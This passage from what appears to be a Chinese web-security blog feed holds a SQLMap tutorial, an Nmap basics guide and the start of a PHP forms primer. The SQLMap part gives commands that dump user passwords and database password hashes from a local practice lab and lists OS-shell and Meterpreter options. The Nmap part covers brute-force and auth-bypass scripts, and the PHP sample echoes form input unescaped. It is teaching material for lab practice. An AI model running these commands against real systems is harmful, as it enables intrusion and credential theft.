执行操作系统命令</li><li>–os-shell 调出交互式操作系统 shell</li><li>–os-pwn 调出 OOB shell，Meterpreter 或 VNC</li></ul><p><strong>常见命令</strong></p><p>sqlmap -u <a href="http://sqlmap.com/index.php?id=1">http://sqlmap.com/index.php?id=1</a> -v 1<br>sqlmap -u “<a href="http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</a> -v 1</p><ul><li>-u 和–url参数一样 都是代表填写测试的url连接 如果存在&amp;符号需要添加把url放在双引号内</li><li>-v 表示 输出信息详细程度级别：0-6（默认为 1）级别越高，信息就越详细，根据需求选择合适的输出信息。</li><li>–os-smbrelay 一键调出 OOB shell，Meterpreter 或 VNC</li><li>–os-bof 利用存储过程的缓冲区溢出</li><li>–priv-esc 数据库进程用户提权</li><li>–msf-path=MSFPATH Metasploit 框架的本地安装路径</li><li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li></ul><p><strong>访问 Windows 注册表：</strong></p><p>以下选项用于访问后端数据库管理系统的 Windows 注册表</p><ul><li>–reg-read 读取一个 Windows 注册表键值</li><li>–reg-add 写入一个 Windows 注册表键值数据</li><li>–reg-del 删除一个 Windows 注册表键值</li><li>–reg-key=REGKEY 指定 Windows 注册表键</li><li>–reg-value=REGVAL 指定 Windows 注册表键值</li><li>–reg-data=REGDATA 指定 Windows 注册表键值数据</li><li>–reg-type=REGTYPE 指定 Windows 注册表键值类型</li></ul><p><strong>通用选项：</strong></p><p>以下选项用于设置通用的参数</p><ul><li>-s SESSIONFILE 从文件（.sqlite）中读入会话信息</li><li>-t TRAFFICFILE 保存所有 HTTP 流量记录到指定文本文件</li><li>–batch 从不询问用户输入，使用默认配置</li><li>–binary-fields=.. 具有二进制值的结果字段（例如：”digest”）</li><li>–check-internet 在访问目标之前检查是否正常连接互联网</li><li>–crawl=CRAWLDEPTH 从目标 URL 开始爬取网站</li><li>–crawl-exclude=.. 用正则表达式筛选爬取的页面（例如：”logout”）</li><li>–csv-del=CSVDEL 指定输出到 CVS 文件时使用的分隔符（默认为“,”）</li><li>–charset=CHARSET 指定 SQL 盲注字符集（例如：”0123456789abcdef”）</li><li>–dump-format=DU.. 导出数据的格式（CSV（默认），HTML 或 SQLITE）</li><li>–encoding=ENCOD.. 指定获取数据时使用的字符编码（例如：GBK）</li><li>–eta 显示每个结果输出的预计到达时间</li><li>–flush-session 清空当前目标的会话文件</li><li>–forms 解析并测试目标 URL 的表单</li><li>–fresh-queries 忽略存储在会话文件中的查询结果</li><li>–har=HARFILE 将所有 HTTP 流量记录到一个 HAR 文件中</li><li>–hex 获取数据时调用 DBMS 的 hex 函数</li><li>–output-dir=OUT.. 自定义输出目录路径</li><li>–parse-errors 从响应中解析并显示 DBMS 错误信息</li><li>–save=SAVECONFIG 将选项设置保存到一个 INI 配置文件</li><li>–scope=SCOPE 用正则表达式从提供的代理日志中过滤目标</li><li>–test-filter=TE.. 根据 payloads 和/或标题（例如：ROW）选择测试</li><li>–test-skip=TEST.. 根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</li><li>–update 更新 sqlmap</li></ul><p><strong>其他选项：</strong></p><ul><li>-z MNEMONICS 使用短助记符（例如：“flu,bat,ban,tec=EU”）</li><li>–alert=ALERT 在找到 SQL 注入时运行 OS 命令</li><li>–answers=ANSWERS 设置问题答案（例如：“quit=N,follow=N”）</li><li>–beep 出现问题提醒或在发现 SQL 注入时发出提示音</li><li>–cleanup 指定移除 DBMS 中的特定的 UDF 或者数据表</li><li>–dependencies 检查 sqlmap 缺少什么（非核心）依赖</li><li>–disable-coloring 关闭彩色控制台输出</li><li>–gpage=GOOGLEPAGE 指定页码使用 Google dork 结果</li><li>–identify-waf 针对 WAF/IPS/IDS 保护进行彻底的测试</li><li>–mobile 使用 HTTP User-Agent 模仿智能手机</li><li>–offline 在离线模式下工作（仅使用会话数据）</li><li>–purge-output 安全地删除输出目录的所有内容</li><li>–skip-waf 跳过启发式检测 WAF/IPS/IDS 保护</li><li>–smart 只有在使用启发式检测时才进行彻底的测试</li><li>–sqlmap-shell 调出交互式 sqlmap shell</li><li>–tmp-dir=TMPDIR 指定用于存储临时文件的本地目录</li><li>–web-root=WEBROOT 指定 Web 服务器根目录（例如：”/var/www”）</li><li>–wizard 适合初级用户的向导界面</li></ul><h4 id="3-SQLMap-入门"><a href="#3-SQLMap-入门" class="headerlink" title="3. SQLMap 入门"></a>3. SQLMap 入门</h4><p>搭建 sql-labs 靶场，</p><p>SQLiLabs源码下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>使用phpstudy搭建: <a href="https://www.xp.cn/">https://www.xp.cn/</a></p><p>下载之后开启 apache 和 mysql ，将下载的源码解压到 WWW 目录下，然后访问 <a href="http://127.0.0.1/sqli-labs-master/">http://127.0.0.1/sqli-labs-master/</a> 首页，点击 Setup/reset Database for labs 设置数据库信息即可完成靶场搭建。</p><p><strong>判断是否存在注入</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/va5xDP.jpg" alt="判断注入"></p><blockquote><p>当注入点后面的参数大于等于两个时，需要加双引号，如：<code>python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=1&amp;uid=2"</code></p></blockquote><p>当开始检测后，会出现选项，第一处意思是：检测到的数据库可能是MYSql，是否需要跳过检测其他数据库；第二处意思：对于剩余的测试，是否想要包含“MySQL”扩展提供的level级别(1)和risk风险(1)值的所有测试；第三处意思：GET参数存在漏洞，是否继续测试其他参数。（这里可以使用 –batch 参数跳过询问用户输入，使用默认配置 ）</p><p>如果检测的时候，没有出现这三个提示，是因为你之前测试过，存在缓存信息，可以使用 –flush-session 清除缓存信息。</p><p><strong>判断文本中的请求是否存在注入</strong></p><p>可以先进行抓取数据包，然后保存到 .txt 文件中，使用 -r 参数指定 HTTP 数据包文件</p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -r c:\1.txt</code></pre><blockquote><p>-r 参数，一般存在 cookie 注入时使用。</p></blockquote><p><strong>查询当前用户下的所有数据库</strong></p><p>在确定存在注入点之后，查询当前用户下的所有数据库信息。</p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --dbs</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vd9Q0S.jpg" alt="数据库信息"></p><p><strong>获取数据库中的表名</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 -D security --tables</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vdCLG9.jpg" alt="表的信息"></p><p><strong>获取表中的字段</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 -D security -T <span class="token function">users</span> --columns</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vdPZsP.jpg" alt="字段信息"></p><p><strong>获取字段内容</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 -D security -T <span class="token function">users</span> -C username,password --dump</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vdPjYQ.jpg" alt="账号和密码"></p><p><strong>获取数据库所有用户</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --users</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vdimlR.jpg" alt="数据库用户信息"></p><p><strong>获取数据库用户的密码</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --passwords</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vdiUXt.jpg" alt="数据库用户密码"></p><blockquote><p>密码使用MySQL5加密</p></blockquote><p><strong>获取当前网站数据库的名称</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --current-db</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vdibcR.jpg" alt="当前网站数据库名"></p><p><strong>获取当前网站数据库的用户名称</strong></p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --current-user</code></pre><p><img src="https://s1.ax1x.com/2022/08/15/vdFc5D.jpg" alt="当前网站数据库用户名"></p>]]></content>
      
      
      <categories>
          
          <category> pentest tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> tools </tag>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全Nmap基础</title>
      <link href="/2022/08/12/toc-heading-7/"/>
      <url>/2022/08/12/toc-heading-7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-nmap-概述"><a href="#0x001-nmap-概述" class="headerlink" title="0x001 nmap 概述"></a>0x001 nmap 概述</h3><hr><p><code>Nmap</code>是一款开源免费的网络发现（<code>Network Discovery</code>）和安全审计（<code>Security Auditing</code>）工具。软件名字<code>Nmap</code>是<code>Network Mapper</code>的简称。<code>Nmap</code>最初是由<code>Fyodor</code>在1997年开始创建的。随后在开源社区众多的志愿者参与下，该工具逐渐成为最为流行安全必备工具之一。<br>一般情况下，<code>Nmap</code>用于列举网络主机清单、管理服务升级调度、监控主机或服务运行状况。<code>Nmap</code>可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。</p><hr><h3 id="0x002-nmap-特点"><a href="#0x002-nmap-特点" class="headerlink" title="0x002 nmap 特点"></a>0x002 nmap 特点</h3><hr><ul><li>主机探测：探测网络上的主机，如列出响应TCP和ICMP请求、ICMP请求、开放特别端口的主机。</li><li>端口扫描：探测目标主机所开放的端口。</li><li>版本检测：探测目标主机的网络服务，判断其服务名称及版本号。</li><li>系统检测：探测目标主机的操作系统及网络设备的硬件特性。</li></ul><hr><h3 id="0x003-nmap-端口状态介绍"><a href="#0x003-nmap-端口状态介绍" class="headerlink" title="0x003 nmap 端口状态介绍"></a>0x003 nmap 端口状态介绍</h3><hr><table><thead><tr><th>状态</th><th>含义</th></tr></thead><tbody><tr><td>open</td><td>开放的，表示应用程序正在监听该端口的连接，外部可以访问</td></tr><tr><td>filtered</td><td>被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问</td></tr><tr><td>closed</td><td>关闭的，表示目标主机未开启该端口</td></tr><tr><td>unfiltered</td><td>未被过滤的，表示 Nmap 无法确定端口所处状态，需进一步探测</td></tr><tr><td>open/filetered</td><td>开放的或被过滤的，Nmap 不能识别</td></tr><tr><td>closed/filtered</td><td>关闭的或被过滤的，Namp 不能识别</td></tr></tbody></table><hr><h3 id="0x004-nmap-扫描参数"><a href="#0x004-nmap-扫描参数" class="headerlink" title="0x004 nmap 扫描参数"></a>0x004 nmap 扫描参数</h3><hr><p>语法结构：</p><pre class=" language-bash"><code class="language-bash">nmap <span class="token punctuation">[</span>Scan Type<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>Options<span class="token punctuation">]</span> <span class="token punctuation">{</span>target specification<span class="token punctuation">}</span></code></pre><h4 id="1-扫描目标格式"><a href="#1-扫描目标格式" class="headerlink" title="1.扫描目标格式"></a>1.扫描目标格式</h4><ul><li>-iL:从文件中加载目标</li><li>-iR:随机扫描</li><li>–exclude <host or="" network="">:排除网段或主机地址</host></li><li>–excledefile:排除文件中的地址</li></ul><h4 id="2-主机发现"><a href="#2-主机发现" class="headerlink" title="2.主机发现"></a>2.主机发现</h4><ul><li>-sL:列出需要扫描的目标，不扫描</li><li>-sn:只做ping扫描，不做端口扫描</li><li>-Pn：跳过主机发现，视所有主机都在线</li><li>-PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现</li><li>-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现</li><li>-PO[Protocol list]：基于IP协议字段的ping扫描</li><li>-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析</li><li>–dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器</li><li>–system-dns:调用系统的DNS服务器</li><li>–traceroute：显示追踪到目标的路径</li></ul><h4 id="3-端口扫描方法"><a href="#3-端口扫描方法" class="headerlink" title="3.端口扫描方法"></a>3.端口扫描方法</h4><ul><li>-sS/sT/sA/sW/sM:指定使用TCP SYN/Connect()/ACK/Window/Maimon scans的方式目标主机进行扫描</li><li>-sU:指定使用UDP扫描的方式确定目标主机的UDP端口状况</li><li>-sN/sF/sX:指定使用TCP Null/FIN/Xmas scans秘密扫描的方式协助探测对方的TCP端口状态</li><li>–scanflags<flags>:定制TCP包的flags</flags></li><li>-sI&lt;zombie host[:probeport]&gt;:指定使用Idle scan的方式扫描目标主机(前提是需要找到合适的zombie host)</li><li>-sY/sZ:使用SCTP INIT/COOKIE-ECHO扫描SCTP协议端口的开放情况</li><li>-sO:使用IP protocol扫描确定目标机支持的协议类型</li><li>-b<ftp relay="" host="">:使用FTP bounce scan扫描公式</ftp></li></ul><h4 id="4-端口相关参数"><a href="#4-端口相关参数" class="headerlink" title="4.端口相关参数"></a>4.端口相关参数</h4><ul><li>-p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</li><li>–exclude-ports <port ranges="">: 排除端口</port></li><li>-F：扫描比缺省少的端口（缺省1000，加了-F100）</li><li>-r：顺序扫描端口，缺省是随机分组扫描</li><li>–top-ports <number>:按top排序扫描知名端口</number></li><li>–port-ratio <ratio>: 按比例扫描知名端口，值在0-1之间，越小扫的越多</ratio></li></ul><h4 id="5-系统-x2F-版本检测"><a href="#5-系统-x2F-版本检测" class="headerlink" title="5.系统/版本检测"></a>5.系统/版本检测</h4><ul><li>-sV:探测开放的端口的系统/服务信息</li><li>–version-intensity <level>:指定版本侦测的强度(0-9)，默认为7，数值越高，探测出的服务越准确</level></li><li>–version-light：输出最可能的版本信息，缺省是2</li><li>–version-all：使用所有的探测条件进行版本/系统探测</li><li>–version-trace:打印详细的版本扫描过程</li></ul><h4 id="6-脚本扫描"><a href="#6-脚本扫描" class="headerlink" title="6.脚本扫描"></a>6.脚本扫描</h4><ul><li>–script=<lua scripts="">:指定脚本名称</lua></li><li>–script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数</li><li>–script-help=<lua scripts="">: 查看脚本帮助信息</lua></li><li>–script-updatedb:更新脚本数据库</li></ul><h4 id="7-系统检测"><a href="#7-系统检测" class="headerlink" title="7.系统检测"></a>7.系统检测</h4><ul><li>-O:激活系统探测</li><li>–osscan-limit:只对开放端口的有效主机进行系统探测</li><li>–osscan-guess：推测系统信息</li></ul><h4 id="8-其他"><a href="#8-其他" class="headerlink" title="8.其他"></a>8.其他</h4><ul><li>-T&lt;0-5&gt;:时间模板，越大速度越快，6个级别，推荐T4</li><li>-6：表示使用IPV6探测</li><li>-A：表示使用进攻性扫描</li><li>-V：打印版本号</li><li>-v：增加输出的详细程度</li></ul><hr><h3 id="0x005-常用方法"><a href="#0x005-常用方法" class="headerlink" title="0x005 常用方法"></a>0x005 常用方法</h3><hr><p><strong>扫描单个地址</strong></p><pre class=" language-bash"><code class="language-bash">nmap 192.168.100.10</code></pre><p><strong>扫描多个地址</strong><br>可以是不同网段、或在同一网段的少量地址</p><pre class=" language-bash"><code class="language-bash">nmap 192.168.100.10 192.168.100.15</code></pre><p><strong>扫描一个范围内的目标地址</strong></p><pre class=" language-bash"><code class="language-bash">nmap 192.168.100.10-60</code></pre><p><strong>扫描目标地址所在的某个网段</strong></p><pre class=" language-bash"><code class="language-bash">nmap 192.168.100.10/24</code></pre><p><strong>扫描主机列表 ip.txt 中的所有目标地址</strong></p><pre class=" language-bash"><code class="language-bash">nmap -iL C:\ip.txt</code></pre><p><strong>扫描除某一个目标地址之外的所有目标地址</strong></p><pre class=" language-bash"><code class="language-bash">nmap 192.168.100.10/24 -exclude 192.168.100.60</code></pre><p><strong>扫描除某一文件中的目标地址之外的目标地址</strong></p><pre class=" language-bash"><code class="language-bash">nmap 192.168.100.10/24 -excludefile C:\ip.txt</code></pre><p><strong>扫描某一目标地址的21、22、23、80端口</strong></p><pre class=" language-bash"><code class="language-bash">nmap 192.168.100.10 -p 21,22,23,80</code></pre><p><strong>对目标地址进行路由跟踪</strong></p><pre class=" language-bash"><code class="language-bash">nmap --traceroute 192.168.100.10</code></pre><p><strong>扫描目标地址所在 C 段的在线情况</strong></p><pre class=" language-bash"><code class="language-bash">nmap -sP 192.168.100.10/24</code></pre><p><strong>目标地址的操作系统指纹识别</strong></p><pre class=" language-bash"><code class="language-bash">nmap -O 192.168.100.10</code></pre><p><strong>目标地址提供的服务版本侦测</strong></p><pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.100.10</code></pre><p><strong>探测防火墙状态</strong><br><code>FIN</code>扫描用于识别端口是否关闭，收到<code>RST</code>恢复说明该端口关闭，否则就是<code>open</code>或<code>filtered</code>状态。</p><pre class=" language-bash"><code class="language-bash">nmap -sF -T4 192.168.100.10</code></pre><hr><h3 id="0x006-脚本介绍"><a href="#0x006-脚本介绍" class="headerlink" title="0x006 脚本介绍"></a>0x006 脚本介绍</h3><hr><p><code>Nmap</code>脚本默认存在<code>/xx/nmap/scripts</code>文件夹下</p><p><code>Nmap</code>脚本主要分为以下几类：</p><ul><li>Auth:负责处理鉴权证书（绕过鉴权）的脚本</li><li>Broadcast:在局域网内探测更多服务的开启情况，如DHCP/DNS/SQLServerdeng</li><li>Brute:针对常见的应用提供暴力破解方式，如HTTP/SMTP等</li><li>Default:使用-sC或-A选项扫描时默认的脚本，提供基本的脚本扫描能力</li><li>Discovery:对网络进行更多信息的搜集，如SMB枚举、SNMP查询等</li><li>Dos:用于进行拒绝服务攻击</li><li>Exploit:利用已知的漏洞入侵系统</li><li>External:利用第三方的数据库或资源。例如：进行whois解析</li><li>Fuzzer:模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞</li><li>Intrusive:入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</li><li>Malware:探测目标机是否感染了病毒，属于安全性脚本</li><li>Safe:此类与Intrusive相反，属于安全性脚本</li><li>Version:负责增强服务与版本扫描功能的脚本</li><li>Vuln:负责检查目标机是否有常见漏洞，如MS08-067</li></ul><hr><h3 id="0x007-nmap-进阶"><a href="#0x007-nmap-进阶" class="headerlink" title="0x007 nmap 进阶"></a>0x007 nmap 进阶</h3><hr><p>常用脚本实例</p><p><strong>鉴权扫描</strong></p><pre class=" language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span>auth 192.168.100.10</code></pre><p><strong>暴力破解攻击</strong></p><pre class=" language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span>brute 192.168.100.10</code></pre><p><strong>扫描常见的端口</strong></p><pre class=" language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span>vuln 192.168.100.10</code></pre><p><strong>应用服务扫描</strong></p><pre class=" language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span>realvnc-auth-bypass</code></pre><p> 192.168.100.10<br><strong>探测局域网内更多服务开启的情况</strong></p><pre class=" language-bash"><code class="language-bash">nmap -n -p 445 --script<span class="token operator">=</span>broadcast 192.168.100.10</code></pre><p><strong>whois解析</strong></p><pre class=" language-bash"><code class="language-bash">nmap -script external baidu.com</code></pre><hr><h3 id="0x008-更多教程"><a href="#0x008-更多教程" class="headerlink" title="0x008 更多教程"></a>0x008 更多教程</h3><hr><p><a href="https://nmap.org/">nmap官网</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> tools </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全PHP基础</title>
      <link href="/2022/08/12/toc-heading-6/"/>
      <url>/2022/08/12/toc-heading-6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-PHP-表单"><a href="#0x001-PHP-表单" class="headerlink" title="0x001 PHP 表单"></a>0x001 PHP 表单</h3><hr><h4 id="1-HTML-表单"><a href="#1-HTML-表单" class="headerlink" title="1. HTML 表单"></a>1. HTML 表单</h4><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        账号：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>        密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>当用户填写此表单并点击提交按钮后，表单数据会发送到名为 “index.php” 的 PHP 文件供处理。表单数据是通过 HTTP POST 方法发送的。</p><p>GET 方式和 POST方式的区别：</p><ul><li>$_GET 是通过 URL 参数传递到当前脚本的变量数组。</li><li>$_POST 是通过 HTTP POST 传递到当前脚本的变量数组。</li></ul><p>获取提交的内容信息：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    账号：<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span>    密码：<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>GET 方式的表单实现方式和 POST 差不多，只需把 POST 替换为 GET 方式就可以 </p><h4 id="2-PHP-表单验证"><a href="#2-PHP-表单验证" class="headerlink" title="2. PHP 表单验证"></a>2. PHP 表单验证</h4><p>先写一个简单的 PHP 表单</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token constant">PHP</span> 表单<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup">&lt;form method="POST" action="<span class="token prolog">&lt;?php echo htmlspecialchars($_SERVER['PHP_SELF']);?></span></span>"<span class="token operator">></span>        姓名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        邮箱：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        网址：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        性别：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>男             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>女<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        评论：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>comment<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token 